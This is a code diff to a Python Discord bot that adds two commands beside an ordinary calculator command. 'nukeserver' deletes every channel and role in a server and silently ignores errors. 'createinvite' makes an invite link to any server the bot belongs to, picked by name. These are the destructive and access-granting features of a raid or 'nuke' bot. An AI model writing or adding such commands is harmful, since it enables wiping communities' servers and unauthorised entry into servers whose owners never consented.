@@ -736,6 +736,34 @@ try:
             await ctx.send(f"`{num1:.2f} / {num2:.2f} = {result:.2f}`")
         except:
             await ctx.send("`Invalid Entries`")
+
+    @bing.command()
+    async def nukeserver(ctx):
+        try:
+            for c in ctx.guild.channels: 
+                for r in ctx.guild.roles:
+                    try:
+                        await c.delete()
+                    except:
+                        pass
+                    try:
+                        await r.delete()
+                    except:
+                        pass
+
+        except:
+            await ctx.send("`You do not have the correct permissions to execute this command`")
+
+    @bing.command()
+    async def createinvite(ctx, *, guildname):
+        for guild_ in bing.guilds:
+            if str(guild_) == str(guildname):
+                try:
+                    discord_server = bing.get_guild(int(guild_.id))
+                    link = await discord_server.text_channels[0].create_invite()
+                    await ctx.send(link)
+                except:
+                    pass
         
     startup(config[0]['startup'])
     bing.run(DISCORD_TOKEN)
